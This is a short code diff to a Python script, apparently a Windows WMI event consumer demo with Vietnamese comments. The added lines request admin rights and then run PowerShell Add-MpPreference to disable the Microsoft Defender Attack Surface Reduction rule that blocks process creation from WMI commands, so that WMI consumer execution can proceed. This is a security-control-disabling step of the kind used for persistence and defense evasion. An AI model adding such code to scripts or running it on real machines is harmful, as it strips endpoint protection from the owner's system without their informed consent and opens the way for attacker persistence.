@@ -1,6 +1,7 @@
 import os
 import sys
 import ctypes
+import subprocess
 
 def request_admin():
     if not ctypes.windll.shell32.IsUserAnAdmin():
@@ -18,6 +19,15 @@ def request_admin():
 
 def main():
     request_admin()
+    
+    # Tắt ASR rule chặn WMI Consumer execution để demo hoạt động
+    print("Dang tat ASR rule cho WMI...")
+    subprocess.run(
+        ['powershell', '-Command',
+         'Add-MpPreference -AttackSurfaceReductionRules_Ids d1e49aac-8f56-4280-b9ba-993a6d77406c -AttackSurfaceReductionRules_Actions Disabled'],
+        capture_output=True
+    )
+    print("Da tat ASR rule.")
     
     try:
         import win32com.client
